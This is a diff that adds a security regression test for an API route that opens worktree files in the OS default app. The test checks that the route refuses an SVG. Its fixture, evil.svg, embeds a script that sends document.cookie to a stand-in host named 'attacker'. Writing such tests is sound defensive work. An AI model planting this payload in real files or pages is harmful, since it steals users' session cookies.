@@ -124,6 +124,22 @@ describe("POST /api/runs/:id/open-in — target 'default' (local-mode file open,
     expect(openFileInDefaultApp).not.toHaveBeenCalled();
   });
 
+  it('refuses an SVG — the OS default handler would run its <script>, with no CSP to stop it', async () => {
+    // Reachable in practice: a repo's own `.gitattributes` (`*.svg binary`) makes numstat report
+    // the SVG binary, which flips `shouldPreviewImage` on and renders the "Open in default app"
+    // button for it. The raw route may still serve this file (inert <img> + no-script CSP) —
+    // this route may not, because handing it to the OS applies neither mitigation.
+    writeFileSync(
+      join(worktree, 'evil.svg'),
+      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://attacker/"+document.cookie)</script></svg>',
+    );
+    const res = await post({ target: 'default', path: 'evil.svg' });
+    expect(res.status).toBe(409);
+    // The refusal names the actual rule — an SVG is an image, so "limited to images" would lie.
+    expect(((await res.json()) as { error: string }).error).toContain('SVG can carry scripts');
+    expect(openFileInDefaultApp).not.toHaveBeenCalled();
+  });
+
   it('refuses an ordinary text file in the worktree just the same', async () => {
     writeFileSync(join(worktree, 'notes.txt'), 'hello');
     const res = await post({ target: 'default', path: 'notes.txt' });
